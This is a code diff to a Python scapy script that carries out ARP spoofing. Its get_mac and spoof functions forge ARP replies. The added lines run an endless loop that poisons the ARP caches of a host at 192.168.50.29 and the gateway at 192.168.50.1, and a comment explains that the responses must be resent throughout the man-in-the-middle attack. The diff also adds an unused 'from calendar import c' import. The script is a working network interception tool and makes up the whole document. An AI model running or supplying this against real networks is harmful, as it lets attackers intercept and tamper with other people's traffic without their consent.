@@ -1,4 +1,6 @@
+from calendar import c
 import scapy.all as scapy
+import time
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -11,5 +13,22 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
+
+send_packets_count = 0
+while True:
+    spoof("192.168.50.29", "192.168.50.1")
+    spoof("192.168.50.1", "192.168.50.29")
+    send_packets_count = send_packets_count + 2
+    print("[+] Packets sent: " + str(send_packets_count))
+    time.sleep(2)
+
+
+
+
+
+
+# Notes:
+# Need to constantly send the arp responses over the period of MITM
+#   arp cache can be reset often or after certain conditions
 
